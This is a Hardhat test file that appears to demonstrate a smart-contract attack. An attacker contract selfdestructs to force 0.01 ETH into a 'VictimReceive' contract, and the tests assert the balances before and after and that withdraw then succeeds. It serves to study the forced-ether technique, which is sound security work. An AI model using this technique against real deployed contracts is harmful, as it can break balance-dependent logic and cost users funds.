const { ethers } = require("hardhat");
const { expect } = require("chai");
const { getBalance, parseEther, ZERO_ADDRESS } = require("../utils/utils");

describe("Selfdestruct", () => {
    before(async () => {
        const signers = await ethers.getSigners();
        [caller, receiver] = signers;

        const VictimReceive = await ethers.getContractFactory("VictimReceive");
        const Selfdestruct = await ethers.getContractFactory("Selfdestruct");

        victimReceive = await VictimReceive.deploy();
        selfdestruct = await Selfdestruct.deploy(victimReceive.address, { value: parseEther(0.01) });

        expect(await selfdestruct.receiver()).to.eq(victimReceive.address);
    });

    describe("attack victim", () => {
        it("check balance both contracts before attack", async () => {
            //check victim balance before attack
            expect(await getBalance(victimReceive.address)).to.eq(0);
            //check attacker balance before attack
            expect(await getBalance(selfdestruct.address)).to.eq(parseEther(0.01));
        })

        it("should return exception not enough eth to withdraw", async () => {
            await expect(victimReceive.withdraw()).to.revertedWith("not enough eth to withdraw");
        })

        it("self destruct contract attacker and force the victim receive eth", async () => {
            await selfdestruct.destroy();
            expect(await getBalance(selfdestruct.address)).to.eq(0);
            expect(await getBalance(victimReceive.address)).to.eq(parseEther(0.01));
        })

        it("should call withdraw successfully", async () => {
            await expect(() => victimReceive.withdraw()).to.changeEtherBalance(caller, parseEther(0.01));
        })
    });
});
